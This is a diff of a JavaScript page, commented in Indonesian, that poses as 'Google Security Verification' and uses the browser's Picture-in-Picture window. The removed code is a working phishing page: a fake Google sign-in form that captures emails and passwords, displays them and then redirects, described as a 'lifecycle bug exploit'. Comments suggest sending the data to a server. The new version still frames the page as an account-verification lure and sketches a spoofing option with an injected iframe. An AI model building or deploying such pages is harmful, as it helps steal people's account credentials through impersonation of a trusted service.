@@ -19,7 +19,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengisi formulir.</p>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke halaman Google melalui jendela verifikasi.</p>
   <button id="startBtn">Verify Account</button>
   <div id="status">[*] Ready...</div>
 </div>
@@ -33,14 +33,14 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Lifecycle] " + msg);
+    console.log("[PiP Navigation] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK) - LIFECYCLE BUG
+  // 1. TRIGGER (KLIK)
   // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Memulai lifecycle bug exploit...");
+    log("[*] Memulai PiP navigation...");
 
     try {
       if (!window.documentPictureInPicture) {
@@ -52,130 +52,36 @@
       // 2. BUKA PiP
       // ============================================
       const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 400,
-        height: 500
+        width: 500,
+        height: 600
       });
 
       log('PiP Window Opened.');
 
       // ============================================
-      // 3. TULIS ULANG DOKUMEN PiP (MANDIRI)
+      // 3. NAVIGASI PiP KE GOOGLE.COM
       // ============================================
-      // Kita menulis ulang seluruh dokumen PiP dengan script mandiri.
-      // Script ini tidak bergantung pada parent dan akan tetap berjalan
-      // meskipun parent di-redirect.
-      pipWindow.document.open();
-      pipWindow.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <meta charset="UTF-8">
-          <title>Google Accounts</title>
-          <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-              background: #fff;
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-              align-items: center;
-              min-height: 100vh;
-              padding: 20px;
-              text-align: center;
-            }
-            .g-logo {
-              font-size: 32px;
-              font-weight: bold;
-              color: #4285f4;
-              margin-bottom: 20px;
-            }
-            h3 { font-size: 20px; color: #333; margin-bottom: 5px; }
-            p { font-size: 13px; color: #666; margin-bottom: 20px; }
-            input {
-              width: 100%;
-              padding: 12px;
-              margin-bottom: 12px;
-              border: 1px solid #ddd;
-              border-radius: 6px;
-              font-size: 14px;
-            }
-            button {
-              width: 100%;
-              padding: 12px;
-              background: #1a73e8;
-              color: #fff;
-              border: none;
-              border-radius: 6px;
-              font-size: 14px;
-              font-weight: bold;
-              cursor: pointer;
-            }
-            .warning {
-              margin-top: 15px;
-              font-size: 11px;
-              color: #f00;
-            }
-          </style>
-        </head>
-        <body>
-          <div class="g-logo">G</div>
-          <h3>Sign in</h3>
-          <p>to continue to Gmail</p>
-          <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
-          <input type="password" id="pipPassword" placeholder="Password" />
-          <button id="pipLogin">Next</button>
-          <div class="warning">This is a simulated phishing test. Do not enter real credentials.</div>
+      // Kita bisa langsung menavigasi PiP ke Google.
+      // Tapi ini akan menampilkan Google asli di PiP.
+      // Untuk spoofing, kita bisa menyuntikkan iframe Google ke PiP.
+      
+      // Opsi A: Navigasi Langsung (PiP menampilkan Google asli)
+      pipWindow.location.href = 'https://www.google.com';
+      
+      log('PiP navigated to google.com.');
 
-          <script>
-            (function() {
-              // Script mandiri di dalam PiP
-              // Tidak bergantung pada parent.
-              
-              document.getElementById('pipLogin').addEventListener('click', function() {
-                var email = document.getElementById('pipEmail').value;
-                var password = document.getElementById('pipPassword').value;
-                
-                if (!email || !password) {
-                  alert("Email dan password harus diisi!");
-                  return;
-                }
-
-                // Kirim data ke parent (opsional, via postMessage)
-                // Tapi jika parent sudah redirect, ini mungkin gagal.
-                // Kita bisa mengirim ke server langsung (fetch) atau menyimpannya.
-                
-                // Tampilkan data di PiP (untuk pengujian)
-                document.body.innerHTML = \`
-                  <div style="font-family:monospace;padding:20px;background:#000;color:#0f0;border-radius:6px;width:100%;">
-                    <h3 style="color:#f00;">Credentials Captured!</h3>
-                    <p><strong>Email:</strong> \${email}</p>
-                    <p><strong>Password:</strong> \${password}</p>
-                    <p style="color:#666;margin-top:15px;">Redirecting to Google...</p>
-                  </div>
-                \`;
-
-                // Redirect PiP ke Google asli (setelah 2 detik)
-                setTimeout(function() {
-                  window.location.href = 'https://www.google.com';
-                }, 2000);
-              });
-            })();
-          <\/script>
-        </body>
-        </html>
-      `);
-      pipWindow.document.close();
-
-      log('Persistent payload injected into PiP.');
+      // Opsi B: Frame Injection (PiP menampilkan iframe Google)
+      // pipWindow.document.body.innerHTML = `
+      //   <iframe src="https://www.google.com" style="width:100%;height:100vh;border:none;"></iframe>
+      // `;
 
       // ============================================
-      // 4. REDIRECT PARENT KE GOOGLE.COM (UJI LIFECYCLE)
+      // 4. REDIRECT PARENT (OPSIONAL)
       // ============================================
-      setTimeout(function() {
-        log('Redirecting parent to google.com...');
-        window.location.replace('https://www.google.com');
-      }, 1000);
+      // Jika ingin parent juga redirect, uncomment baris di bawah.
+      // setTimeout(function() {
+      //   window.location.replace('https://www.google.com');
+      // }, 1000);
 
     } catch (e) {
       log('Error: ' + e.message);
